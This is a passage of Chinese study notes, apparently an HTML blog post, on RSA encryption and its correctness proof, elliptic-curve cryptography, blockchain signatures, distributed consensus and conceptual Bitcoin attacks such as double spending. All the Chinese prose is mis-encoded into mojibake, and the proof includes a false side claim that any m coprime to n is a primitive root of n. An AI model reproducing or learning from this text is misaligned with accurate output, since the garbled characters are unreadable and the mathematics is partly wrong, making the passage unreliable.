<p>å‡è®¾é²å‹ƒè¦å‘çˆ±ä¸½ä¸å‘é€åŠ å¯†ä¿¡æ¯mï¼Œä»–å°±è¦ç”¨çˆ±ä¸½ä¸çš„å…¬é’¥ (n,e) å¯¹mè¿›è¡ŒåŠ å¯†ã€‚è¿™é‡Œéœ€è¦æ³¨æ„ï¼Œmå¿…é¡»æ˜¯æ•´æ•°ï¼ˆå­—ç¬¦ä¸²å¯ä»¥å–asciiå€¼æˆ–unicodeå€¼ï¼‰ï¼Œä¸”må¿…é¡»å°äºnã€‚</p>
<p>æ‰€è°“â€åŠ å¯†â€ï¼Œå°±æ˜¯ç®—å‡ºä¸‹å¼çš„cï¼š</p>
<blockquote>
<p>ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€$m^e â‰¡ c (mod n)$</p>
</blockquote>
<p>çˆ±ä¸½ä¸çš„å…¬é’¥æ˜¯ (3233, 17)ï¼Œé²å‹ƒçš„må‡è®¾æ˜¯65ï¼Œé‚£ä¹ˆå¯ä»¥ç®—å‡ºä¸‹é¢çš„ç­‰å¼ï¼š</p>
<blockquote>
<p>ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€$65^{17} â‰¡ 2790 (mod 3233)$</p>
</blockquote>
<p>äºæ˜¯ï¼Œcç­‰äº2790ï¼Œé²å‹ƒå°±æŠŠ2790å‘ç»™äº†çˆ±ä¸½ä¸ã€‚</p>
<p><strong>ï¼ˆ2ï¼‰è§£å¯†è¦ç”¨ç§é’¥(n,d)</strong></p>
<p>çˆ±ä¸½ä¸æ‹¿åˆ°é²å‹ƒå‘æ¥çš„2790ä»¥åï¼Œå°±ç”¨è‡ªå·±çš„ç§é’¥(3233, 2753) è¿›è¡Œè§£å¯†ã€‚å¯ä»¥è¯æ˜ï¼Œä¸‹é¢çš„ç­‰å¼ä¸€å®šæˆç«‹ï¼š</p>
<blockquote>
<p>ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€$c^d â‰¡ m (mod n)$</p>
</blockquote>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œcçš„dæ¬¡æ–¹é™¤ä»¥nçš„ä½™æ•°ä¸ºmã€‚ç°åœ¨ï¼Œcç­‰äº2790ï¼Œç§é’¥æ˜¯(3233, 2753)ï¼Œé‚£ä¹ˆï¼Œçˆ±ä¸½ä¸ç®—å‡º</p>
<blockquote>
<p>ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€$2790^{2753} â‰¡ 65 (mod 3233)$</p>
</blockquote>
<p>å› æ­¤ï¼Œçˆ±ä¸½ä¸çŸ¥é“äº†é²å‹ƒåŠ å¯†å‰çš„åŸæ–‡å°±æ˜¯65ã€‚</p>
<p>è‡³æ­¤ï¼Œâ€åŠ å¯†â€“è§£å¯†â€çš„æ•´ä¸ªè¿‡ç¨‹å…¨éƒ¨å®Œæˆã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå¦‚æœä¸çŸ¥é“dï¼Œå°±æ²¡æœ‰åŠæ³•ä»cæ±‚å‡ºmã€‚è€Œå‰é¢å·²ç»è¯´è¿‡ï¼Œè¦çŸ¥é“då°±å¿…é¡»åˆ†è§£nï¼Œè¿™æ˜¯æéš¾åšåˆ°çš„ï¼Œæ‰€ä»¥RSAç®—æ³•ä¿è¯äº†é€šä¿¡å®‰å…¨ã€‚</p>
<p>ä½ å¯èƒ½ä¼šé—®ï¼Œå…¬é’¥(n,e) åªèƒ½åŠ å¯†å°äºnçš„æ•´æ•°mï¼Œé‚£ä¹ˆå¦‚æœè¦åŠ å¯†å¤§äºnçš„æ•´æ•°ï¼Œè¯¥æ€ä¹ˆåŠï¼Ÿæœ‰ä¸¤ç§è§£å†³æ–¹æ³•ï¼šä¸€ç§æ˜¯æŠŠé•¿ä¿¡æ¯åˆ†å‰²æˆè‹¥å¹²æ®µçŸ­æ¶ˆæ¯ï¼Œæ¯æ®µåˆ†åˆ«åŠ å¯†ï¼›å¦ä¸€ç§æ˜¯å…ˆé€‰æ‹©ä¸€ç§â€å¯¹ç§°æ€§åŠ å¯†ç®—æ³•â€ï¼ˆæ¯”å¦‚<a href="https://zh.wikipedia.org/wiki/%E8%B5%84%E6%96%99%E5%8A%A0%E5%AF%86%E6%A0%87%E5%87%86">DES</a>ï¼‰ï¼Œç”¨è¿™ç§ç®—æ³•çš„å¯†é’¥åŠ å¯†ä¿¡æ¯ï¼Œå†ç”¨RSAå…¬é’¥åŠ å¯†DESå¯†é’¥ã€‚</p>
<h4 id="ç§é’¥è§£å¯†è¯æ˜"><a href="#ç§é’¥è§£å¯†è¯æ˜" class="headerlink" title="ç§é’¥è§£å¯†è¯æ˜"></a>ç§é’¥è§£å¯†è¯æ˜</h4><p>æœ€åï¼Œæˆ‘ä»¬æ¥è¯æ˜ï¼Œä¸ºä»€ä¹ˆç”¨ç§é’¥è§£å¯†ï¼Œä¸€å®šå¯ä»¥æ­£ç¡®åœ°å¾—åˆ°mã€‚ä¹Ÿå°±æ˜¯è¯æ˜ä¸‹é¢è¿™ä¸ªå¼å­ï¼š</p>
<blockquote>
<p>ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€$c^d â‰¡ m (mod n)$</p>
</blockquote>
<p>å› ä¸ºï¼Œæ ¹æ®åŠ å¯†è§„åˆ™</p>
<blockquote>
<p>ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€$ï½^e â‰¡ c (mod n)$</p>
</blockquote>
<p>äºæ˜¯ï¼Œcå¯ä»¥å†™æˆä¸‹é¢çš„å½¢å¼ï¼š</p>
<blockquote>
<p>ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€$c &#x3D; m^e - k*n$</p>
</blockquote>
<p>å°†cä»£å…¥è¦æˆ‘ä»¬è¦è¯æ˜çš„é‚£ä¸ªè§£å¯†è§„åˆ™ï¼š</p>
<blockquote>
<p>ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€$(m^e - k*n)^d â‰¡ m (mod n)$</p>
</blockquote>
<p>å®ƒç­‰åŒäºæ±‚è¯</p>
<blockquote>
<p>ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€$m^{e*d} â‰¡ m (mod n)$</p>
</blockquote>
<p>ç”±äº</p>
<blockquote>
<p>ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€$e*d â‰¡ 1 (mod Ï†(n))$</p>
</blockquote>
<p>æ‰€ä»¥</p>
<blockquote>
<p>ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€$e<em>d &#x3D; h</em>Ï†(n)+1$</p>
</blockquote>
<p>å°†edä»£å…¥ï¼š</p>
<blockquote>
<p>ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€$m^{h*Ï†(n)+1} â‰¡ m (mod n)$</p>
</blockquote>
<p>æ¥ä¸‹æ¥ï¼Œåˆ†æˆä¸¤ç§æƒ…å†µè¯æ˜ä¸Šé¢è¿™ä¸ªå¼å­ã€‚</p>
<p><strong>ï¼ˆ1ï¼‰mä¸näº’è´¨(å¦‚æœmä¸näº’è´¨,åˆ™mæ˜¯nçš„åŸæ ¹)ã€‚</strong></p>
<p>æ ¹æ®æ¬§æ‹‰å®šç†ï¼Œæ­¤æ—¶</p>
<blockquote>
<p>ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€$m^{Ï†(n)}â‰¡ 1 (mod n)$</p>
</blockquote>
<p>å¾—åˆ°</p>
<blockquote>
<p>ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€$(m^{Ï†(n)})^h * m â‰¡ m (mod n)$</p>
</blockquote>
<p>åŸå¼å¾—åˆ°è¯æ˜ã€‚</p>
<p><strong>ï¼ˆ2ï¼‰mä¸nä¸æ˜¯äº’è´¨å…³ç³»ã€‚</strong></p>
<p>æ­¤æ—¶ï¼Œç”±äºnç­‰äºè´¨æ•°på’Œqçš„ä¹˜ç§¯ï¼Œæ‰€ä»¥må¿…ç„¶ç­‰äºk*pæˆ–k*qã€‚</p>
<blockquote>
<p>å› ä¸ºmä¸nä¸æ˜¯äº’è´¨å…³ç³»ï¼Œè¯´æ˜mä¸næœ‰å…±åŒçš„å…¬å› å­gï¼Œå‡è®¾m&#x3D;hgï¼Œç”±äºn&#x3D;pqï¼Œpä¸qäº’è´¨ï¼Œnåªæœ‰på’Œqä¸¤ä¸ªå› å­ï¼Œæ‰€ä»¥gå’Œhå¿…ç„¶æœ‰ä¸€ä¸ªç­‰äºqæˆ–è€…pï¼Œ æ‰€ä»¥æ‰æœ‰ç»“è®ºâ€œmå¿…ç„¶ç­‰äºkpæˆ–kqâ€</p>
</blockquote>
<p>ä»¥ m &#x3D; kpä¸ºä¾‹ï¼Œè€ƒè™‘åˆ°è¿™æ—¶kä¸qå¿…ç„¶äº’è´¨ï¼Œåˆ™æ ¹æ®æ¬§æ‹‰å®šç†ï¼Œä¸‹é¢çš„å¼å­æˆç«‹ï¼š</p>
<blockquote>
<p>ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€$(k*p)^{q-1} â‰¡ 1 (mod q)$</p>
</blockquote>
<p>è¿›ä¸€æ­¥å¾—åˆ°</p>
<blockquote>
<p>ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€$[(k<em>p)^{q-1}]^{h(p-1)} *  k</em>p â‰¡ k*p  (mod q)$</p>
</blockquote>
<p>å³</p>
<blockquote>
<p>ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€$(k<em>p)^{e</em>d} â‰¡ k*p (mod q)$</p>
</blockquote>
<p>å°†å®ƒæ”¹å†™æˆä¸‹é¢çš„ç­‰å¼</p>
<blockquote>
<p>ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€$(k<em>p)^{e</em>d} &#x3D; t<em>q + k</em>p$</p>
</blockquote>
<p>è¿™æ—¶tå¿…ç„¶èƒ½è¢«pæ•´é™¤ï¼Œå³ t&#x3D;tâ€™*p</p>
<blockquote>
<p>ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€$(k<em>p)^{ed} &#x3D; tâ€™<em>p</em>q + k</em>p$</p>
</blockquote>
<p>å› ä¸º m&#x3D;kpï¼Œn&#x3D;pqï¼Œæ‰€ä»¥</p>
<blockquote>
<p>ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€$m^{e*d} â‰¡ m (mod n)$</p>
</blockquote>
<p>åŸå¼å¾—åˆ°è¯æ˜ã€‚</p>
<h4 id="åº”ç”¨"><a href="#åº”ç”¨" class="headerlink" title="åº”ç”¨"></a>åº”ç”¨</h4><p>æ•°å­—ç­¾å</p>
<h3 id="ECCæ¤­åœ†æ›²çº¿åŠ å¯†"><a href="#ECCæ¤­åœ†æ›²çº¿åŠ å¯†" class="headerlink" title="ECCæ¤­åœ†æ›²çº¿åŠ å¯†"></a>ECCæ¤­åœ†æ›²çº¿åŠ å¯†</h3><p>RSAç®—æ³•æ˜¯å½“å‰ä½¿ç”¨æœ€å¹¿çš„éå¯¹ç§°åŠ å¯†ç®—æ³•ã€‚ä½†æ˜¯RSAçš„ç¼ºç‚¹åœ¨äºä¸ºäº†æŠµæŠ—æ”»å‡»ï¼Œä¸å¾—ä¸å¢åŠ å…¬é’¥çš„é•¿åº¦ã€‚è€Œéšç€é•¿åº¦çš„å¢åŠ ï¼Œè®¡ç®—é‡å’Œå¤æ‚åº¦ä¹Ÿä¸æ–­å¢åŠ ã€‚æ­£æ˜¯å› ä¸ºéå¯¹ç§°åŠ å¯†å¤æ‚åº¦å¤ªé«˜ï¼Œæ‰€ä»¥ä¸€èˆ¬ä»…ç”¨äºåœ¨ç½‘ç»œè¿æ¥å»ºç«‹æ—¶çš„å¯†é’¥åå•†è¿‡ç¨‹ã€‚è€Œä¸”éšç€æ•°å­—å¤§å°çš„å¢åŠ ï¼Œåˆ†è§£çš„æ•ˆç‡ä¼šæé«˜ï¼Œä¹˜æ³•å’Œåˆ†è§£çš„éš¾åº¦å·®è·ä¼šå‡å°ã€‚</p>
<p>æ‰€ä»¥RSAå¹¶ä¸æ˜¯å°†æ¥å¯†ç å­¦ä¸­æœ€ç†æƒ³çš„ç³»ç»Ÿã€‚åœ¨ç†æƒ³çš„trapdoorå‡½æ•°ä¸­ï¼Œæ­£å‘è®¡ç®—ï¼ˆç®€å•çš„è®¡ç®—ï¼‰å’Œåå‘è®¡ç®—ï¼ˆå¤æ‚è®¡ç®—ï¼‰çš„éš¾åº¦åº”è¯¥éšç€æ•°å­—çš„å¢åŠ åŒæ­¥åœ°å¢åŠ ã€‚ æ‰€ä»¥éœ€è¦æ›´å¥½çš„trapdoorå‡½æ•°ã€‚</p>
<h3 id="éå¯¹ç§°åŠ å¯†åœ¨åŒºå—é“¾ä¸­çš„åº”ç”¨"><a href="#éå¯¹ç§°åŠ å¯†åœ¨åŒºå—é“¾ä¸­çš„åº”ç”¨" class="headerlink" title="éå¯¹ç§°åŠ å¯†åœ¨åŒºå—é“¾ä¸­çš„åº”ç”¨"></a>éå¯¹ç§°åŠ å¯†åœ¨åŒºå—é“¾ä¸­çš„åº”ç”¨</h3><p>å…·ä½“å®ç°:</p>
<ol>
<li>é¦–å…ˆç”Ÿæˆä¸€å¯¹å…¬ç§é’¥ (pk,sk)ã€‚ pkæ˜¯å…¬é’¥ï¼Œskæ˜¯ç§é’¥ã€‚</li>
<li>ç­¾åsignã€‚sig &#x3D; sign(sk, message) ,ä½¿ç”¨ç§é’¥å¯¹ä¸€ä»½æ¶ˆæ¯messageè¿›è¡Œå¤„ç†ï¼Œè­¬å¦‚å…ˆå¯¹messageè¿›è¡Œå“ˆå¸Œå¾—åˆ°æ‘˜è¦ï¼Œç„¶åä½¿ç”¨ç§é’¥å¯¹æ‘˜è¦è¿›è¡ŒåŠ å¯†ã€‚</li>
<li>éªŒè¯verifyã€‚ verify(pk, message, sig)ã€‚éªŒè¯æ–¹æ³•ï¼Œè·å¾—è¾“å…¥messageï¼Œç­¾åçš„ç»“æœsigï¼Œä»¥åŠå…¬é’¥ã€‚è­¬å¦‚ï¼Œå¯ä»¥ä½¿ç”¨å…¬é’¥å¯¹ç­¾åç»“æœè¿›è¡Œè§£å¯†ï¼Œå¯¹messageè¿›è¡ŒåŒæ ·æ•£åˆ—å¾—åˆ°çš„æ‘˜è¦ï¼Œæ¯”è¾ƒè§£å¯†çš„ç»“æœå’Œæ‘˜è¦ç»“æœï¼Œå¦‚æœä¸¤ä¸ªç›¸åŒï¼Œè¿™éªŒè¯é€šè¿‡ï¼Œå¦åˆ™ï¼ŒéªŒè¯å¤±è´¥ã€‚</li>
</ol>
<h1 id="åŒºå—é“¾æŠ€æœ¯6-å»ä¸­å¿ƒåŒ–"><a href="#åŒºå—é“¾æŠ€æœ¯6-å»ä¸­å¿ƒåŒ–" class="headerlink" title="åŒºå—é“¾æŠ€æœ¯6:å»ä¸­å¿ƒåŒ–"></a>åŒºå—é“¾æŠ€æœ¯6:å»ä¸­å¿ƒåŒ–</h1><p>å»ä¸­å¿ƒåŒ–é—®é¢˜:åˆ†å¸ƒå¼ä¸€è‡´æ€§æ€§é—®é¢˜</p>
<p>åˆ†å¸ƒå¼å¥½å¤„æ˜¯æ›´åŠ å¯é </p>
<p>å¯¹äºå»ä¸­å¿ƒåŒ–ï¼Œæ¯”ç‰¹å¸åŒºå—é“¾ä¸»è¦é¢ä¸´çš„äº”ä¸ªé—®é¢˜ï¼š</p>
<ol>
<li>è°ç»´æŠ¤äº¤æ˜“è´¦æœ¬ï¼Ÿ</li>
<li>è°èƒ½å†³å®šäº¤æ˜“æ˜¯å¦æ˜¯æœ‰æ•ˆçš„ï¼Ÿ</li>
<li>è°åˆ›å»ºæ–°çš„æ¯”ç‰¹å¸ï¼Ÿ</li>
<li>è°å†³å®šç³»ç»Ÿå˜åŒ–çš„è§„åˆ™ï¼Ÿ</li>
<li>æ¯”ç‰¹å¸å¦‚ä½•è·å¾—äº¤æ˜“çš„ä»·å€¼ï¼Ÿ</li>
</ol>
<h2 id="åˆ†å¸ƒå¼å…±è¯†ï¼ˆdistributed-consensus"><a href="#åˆ†å¸ƒå¼å…±è¯†ï¼ˆdistributed-consensus" class="headerlink" title="åˆ†å¸ƒå¼å…±è¯†ï¼ˆdistributed consensus)"></a>åˆ†å¸ƒå¼å…±è¯†ï¼ˆdistributed consensus)</h2><p>ç»™å‡ºåˆ†å¸ƒå¼å…±è¯†åè®®çš„ä¸€ä¸ªå®šä¹‰å’Œæè¿°ï¼š</p>
<p>æœ‰ n ä¸ªèŠ‚ç‚¹ï¼Œæ¯ä¸ªèŠ‚ç‚¹éƒ½æœ‰è¾“å…¥å€¼ã€‚æœ‰ä¸€äº›èŠ‚ç‚¹å‡ºæ•…éšœæˆ–è€…æ˜¯æ¶æ„çš„ã€‚åˆ†å¸ƒå¼å…±è¯†åè®®çš„ç‰¹ç‚¹æ˜¯ï¼š</p>
<ul>
<li>å¿…é¡»èƒ½å¤Ÿä½¿å¾—æ‰€æœ‰çš„è¯šå®èŠ‚ç‚¹å°±è¾“å…¥å€¼è¾¾æˆä¸€è‡´</li>
<li>è¯¥æœ€ç»ˆä¸€è‡´çš„å€¼æ˜¯ç”±è¯šå®èŠ‚ç‚¹äº§ç”Ÿçš„</li>
</ul>
<h2 id="åŒºå—é“¾å…±è¯†ç®—æ³•"><a href="#åŒºå—é“¾å…±è¯†ç®—æ³•" class="headerlink" title="åŒºå—é“¾å…±è¯†ç®—æ³•"></a>åŒºå—é“¾å…±è¯†ç®—æ³•</h2><p>åœ¨åŒºå—é“¾ä¸­ï¼Œä¸€æ¬¡äº¤æ˜“å¯èƒ½æ˜¯Aliceä»Bobé‚£é‡Œä¹°äº†ä¸€æœ¬ä¹¦ï¼Œæˆ–è€…æ˜¯å…¶å®ƒç‰©å“ï¼Œè¿™å¯ä»¥çº¿ä¸‹å•†è®®ï¼Œç„¶åAliceéœ€è¦æ”¯ä»˜ç»™Bobä¸€ä¸ªæ¯”ç‰¹å¸ã€‚åœ¨æ¯”ç‰¹å¸ç½‘ç»œä¸­ï¼ŒAliceéœ€è¦å¹¿æ’­ä¸€æ¡æ¶ˆæ¯ï¼Œè­¬å¦‚â€œAliceæ”¯ä»˜ç»™Bob 1ä¸ªæ¯”ç‰¹å¸ã€‚â€å¹¶ä¸”ä½¿ç”¨ç§é’¥å¯¹æ¶ˆæ¯è¿›è¡Œç­¾åã€‚</p>
<p>ç°åœ¨çš„é—®é¢˜æ˜¯ï¼ŒBobå¦‚ä½•èƒ½ç¡®è®¤ï¼Œè‡ªå·±ç¡®å®èƒ½å¤Ÿæ”¶åˆ°è¿™ä¸ªæ¯”ç‰¹å¸ï¼Œç„¶åå°†Aliceè´­ä¹°çš„ç‰©å“å‘ç»™å¥¹ã€‚</p>
<p>æ¯”ç‰¹å¸ç³»ç»Ÿçš„ç‰¹æ®Šä¹‹å¤„åœ¨äºï¼š</p>
<ol>
<li>å¼•å…¥äº†æ¿€åŠ±æœºåˆ¶ã€‚å› ä¸ºæ¯”ç‰¹å¸æœ¬èº«å°±æ˜¯ä¸€ç§è´§å¸ï¼Œæ‰€ä»¥å‚ä¸è€…æœ‰å¼ºçƒˆçš„æ„æ„¿èƒ½è·å¾—è¿™ä¸ªå¥–åŠ±ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œç»´æŒæ•´ä¸ªç³»ç»Ÿæ­£å¸¸å·¥ä½œæ‰ç¬¦åˆå¤§å¤šæ•°äººçš„åˆ©ç›Šã€‚</li>
<li>æ¯”ç‰¹å¸çš„éšæœºæ€§ã€‚æ¯”ç‰¹å¸ç½‘ç»œä¸­çš„å…±è¯†å¹¶ä¸æ˜¯ä¸€ä¸‹å­å°±ç¡®å®šçš„ï¼Œåœ¨å®é™…ä¸­ï¼Œå·®ä¸å¤šæ˜¯ä¸€ä¸ªå°æ—¶ä¹‹åï¼ŒåŸºæœ¬å¯ä»¥è®¤ä¸ºå¯¹ä¸€ä¸ªåŒºå—æˆ–è€…ä¸€ç¬”äº¤æ˜“è¿›è¡Œäº†ç¡®è®¤ã€‚ä½†æ˜¯ï¼Œå³ä½¿åœ¨è¿™ä¸ªæ—¶å€™ï¼Œä¹Ÿè¿˜ä¸èƒ½ç¡®è®¤100%ã€‚è€Œæ˜¯ï¼Œéšç€æ—¶é—´çš„æµé€ï¼Œç¡®è®¤æ€§ä¼šé€æ¸å¢å¼ºã€‚</li>
</ol>
<p>æ¯”ç‰¹å¸ç½‘ç»œå®ç°çš„æ˜¯<strong>éšå«å…±è¯†</strong>ï¼ˆimplicit consensusï¼‰ï¼šä¸€ä¸ªåŒºå—å°±æ˜¯ä¸€ä¸ªå…±è¯†çš„è¿‡ç¨‹ï¼Œéšæœºçš„èŠ‚ç‚¹å¯ä»¥æå‡ºæ–°åŒºå—ã€‚å³ä½¿æå‡ºæ–°åŒºå—çš„èŠ‚ç‚¹æ˜¯æ¶æ„çš„ï¼Œæå‡ºæ—¶ä¹Ÿæ²¡æœ‰æ˜¾ç¤ºçš„æŠ•ç¥¨æˆ–è€…å…¶ä»–è¿‡ç¨‹ã€‚å»ºç«‹å…±è¯†çš„è¿‡ç¨‹æ˜¯éšå¼çš„ï¼Œå…¶å®ƒèŠ‚ç‚¹å¦‚æœæ¥å—è¿™ä¸ªåŒºå—ï¼Œå°±ä¼šå»¶ä¼¸å®ƒï¼›å¦åˆ™æ‹’ç»è¿™ä¸ªåŒºå—ï¼Œåˆ™ä¼šæ— è§†å®ƒï¼Œå¹¶å°è¯•å»ºç«‹æ–°åŒºå—å»å–ä»£å®ƒã€‚</p>
<p>ç®€åŒ–çš„æ¯”ç‰¹å¸çš„å…±è¯†ç®—æ³•è¿‡ç¨‹å¦‚ä¸‹ï¼šï¼ˆè¿™é‡Œæ²¡æœ‰è®¨è®ºå¹¿æ’­æ–°åŒºå—çš„èŠ‚ç‚¹æ˜¯å¦‚ä½•é€‰å‡ºçš„ï¼‰</p>
<ol>
<li>å‘æ‰€æœ‰çš„èŠ‚ç‚¹å¹¿æ’­æ–°çš„äº¤æ˜“ã€‚</li>
<li>æ¯ä¸ªèŠ‚ç‚¹å°†æ–°äº¤æ˜“æ‰“åŒ…è¿›åŒºå—ã€‚</li>
<li>æ¯ä¸€è½®ä¸­ä¸€ä¸ªéšæœºçš„èŠ‚ç‚¹å¹¿æ’­è¯¥åŒºå—ã€‚</li>
<li>å¦‚æœåŒºå—ä¸­æ‰€æœ‰çš„äº¤æ˜“éƒ½æ˜¯æœ‰æ•ˆçš„ï¼ˆæ¯”ç‰¹å¸æ²¡æœ‰é‡èŠ±ï¼Œç­¾åæ­£ç¡®ç­‰ï¼‰ï¼Œåˆ™å…¶ä»–èŠ‚ç‚¹æ¥å—è¿™ä¸ªåŒºå—ï¼›</li>
<li>èŠ‚ç‚¹è¡¨ç¤ºæ¥å—è¯¥åŒºå—çš„æ–¹å¼æ˜¯åœ¨ä¹‹åæ–°åˆ›å»ºçš„åŒºå—ä¸­åŒ…æ‹¬è¿™ä¸ªå—çš„å“ˆå¸Œã€‚</li>
</ol>
<p>é’ˆå¯¹è¿™ä¸ªç®—æ³•è®¨è®ºä¸€ä¸‹åœ¨è´§å¸ç½‘ç»œä¸­å¯èƒ½çš„æ”»å‡»æ–¹æ³•ã€‚</p>
<ol>
<li>å·æ¯”ç‰¹å¸ã€‚Aliceæœ‰æ²¡æœ‰å¯èƒ½å»ä½¿ç”¨å…¶ä»–ç”¨æˆ·çš„æ¯”ç‰¹å¸å‘¢ï¼Ÿè­¬å¦‚Aliceåˆ›å»ºäº†ä¸€ä¸ªåŒºå—ï¼ŒåŒºå—ä¸­å¥¹è¯•å›¾ä¼ªé€ ä¸€ä¸ªäº¤æ˜“â€œBobå‘é€10ä¸ªæ¯”ç‰¹å¸ç»™Aliceã€‚â€å¦‚æœè¦è®©è¿™ä¸ªäº¤æ˜“åˆæ³•ï¼Œé‚£ä¹ˆAliceå¿…é¡»èƒ½å¤Ÿä¼ªé€ Bobçš„ç­¾åï¼Œä½†æ˜¯Aliceå¦‚æœæ²¡æœ‰Bobçš„ç§é’¥ï¼Œé‚£ä¹ˆAliceå°±ä¸èƒ½ä¼ªé€ ç­¾åã€‚æ‰€ä»¥ï¼Œåªè¦åº•å±‚çš„å¯†ç å­¦åŸºç¡€æ²¡æœ‰è¢«ç ´åï¼ŒAliceå°±ä¸å¯èƒ½å·Bobçš„å¸ã€‚</li>
<li>æ‹’ç»æœåŠ¡ã€‚å¦‚æœAliceéå¸¸è®¨åŒBobï¼Œå¥¹ä¸æ„¿æ„ä¸ºBobæä¾›æœåŠ¡ï¼Œè­¬å¦‚åœ¨è‡ªå·±åˆ›å»ºçš„åŒºå—ä¸­ï¼ŒAliceå°±ä¼šæ•…æ„å¿½ç•¥æ‰Bobç›¸å…³çš„äº¤æ˜“ã€‚è¿™ä¸ªæ”»å‡»çš„é—®é¢˜æ˜¯ï¼ŒAliceå¹¶ä¸èƒ½æ§åˆ¶åŒºå—çš„äº§ç”Ÿã€‚å³ä½¿Aliceåœ¨ä¸€ä¸ªåŒºå—ä¸­å¿½ç•¥äº†Bobçš„äº¤æ˜“ï¼Œå…¶ä»–è¯šå®çš„èŠ‚ç‚¹ä¼šåœ¨äº¤æ˜“ä¸­åŒ…æ‹¬Bobçš„äº¤æ˜“ã€‚</li>
<li>åŒé‡æ”¯ä»˜ã€‚å‡è®¾Aliceä»Bobè´­ä¹°äº†ä¸€ä¸ªè½¯ä»¶ï¼Œç„¶åå¥¹å¹¿æ’­äº†ä¸€æ¡äº¤æ˜“â€œAliceä»˜ç»™Bobä¸€äº›æ¯”ç‰¹å¸â€ã€‚è¯šå®çš„èŠ‚ç‚¹çœ‹åˆ°äº†è¿™æ¡äº¤æ˜“ï¼Œå¹¶ä¸”å°†äº¤æ˜“åŒ…å«åœ¨åŒºå—ä¸­ã€‚å½“Bobçœ‹åˆ°è¿™æ¡äº¤æ˜“è¢«åŒ…æ‹¬è¿›å»çš„æ—¶å€™ï¼ŒBobè®¤ä¸ºAliceå·²ç»æ”¯ä»˜äº†ï¼Œæ‰€ä»¥å°†è½¯ä»¶å‘é€ç»™äº†Aliceã€‚ç„¶åAliceå¼€å§‹å‡†å¤‡æ”»å‡»ï¼Œå¥¹è‡ªå·±æˆ–è€…å¥¹æ§åˆ¶çš„èŠ‚ç‚¹å¼€å§‹å‡†å¤‡ä¸‹ä¸€ä¸ªåŒºå—ï¼Œåœ¨è¿™ä¸ªåŒºå—ä¸­åŒ…å«çš„æ¶ˆæ¯æ˜¯æŠŠAliceåˆšæ‰ä»˜ç»™Bobçš„å¸ä»˜ç»™è‡ªå·±æˆ–è€…å¥¹æ§åˆ¶çš„è´¦å·â€œAliceä»˜ç»™Aliceä¸€äº›æ¯”ç‰¹å¸â€ã€‚å¦‚æœAliceèƒ½å¤Ÿç»™æˆåŠŸåœ°å°†ç¬¬äºŒæ¡æ”¯ä»˜ä¿¡æ¯åŒ…å«åœ¨åŒºå—é“¾ä¸­ï¼Œé‚£ä¹ˆç¬¬ä¸€æ¡æ¶ˆæ¯ï¼Œå°†ä¼šè¢«å¿½è§†ï¼Œå°±åƒä»æ¥æ²¡æœ‰å‡ºç°è¿‡ä¸€æ ·ã€‚</li>
</ol>
<p>ä¸‹é¢æ˜¯åŒé‡æ”¯ä»˜çš„ç¤ºä¾‹å›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233997.jpg" alt="img"></p>
<p>Aliceå¯ä»¥æ„é€ ä¸€ä¸ªæ–°çš„äº¤æ˜“ï¼Œå°†æ”¯ä»˜ç»™Bobçš„é’±å†æ”¯ä»˜ç»™è‡ªå·±ã€‚å¦‚æœå¥¹èƒ½æ§åˆ¶åç»­åŒºå—çš„äº§ç”Ÿï¼Œé‚£ä¹ˆä»˜ç»™Bobçš„äº¤æ˜“ä¼šåƒä»æ¥æ²¡æœ‰å­˜åœ¨è¿‡ä¸€æ ·ã€‚</p>
<p>é—®é¢˜æ˜¯ï¼ŒåŒé‡æ”»å‡»èƒ½å¦æˆåŠŸï¼Œå®Œå…¨å–å†³äºåŒºå—é“¾åˆ°åº•æ²¿ç€é‚£æ¡é“¾å»¶ç»­ã€‚è¯šå®çš„èŠ‚ç‚¹ä¼šæ²¿ç€æœ€é•¿çš„é“¾åˆ›å»ºè‡ªå·±çš„åŒºå—ã€‚æ‰€ä»¥ç­”æ¡ˆå°±æ˜¯ï¼Œæ²¡æœ‰æ­£ç¡®çš„ç­”æ¡ˆã€‚</p>
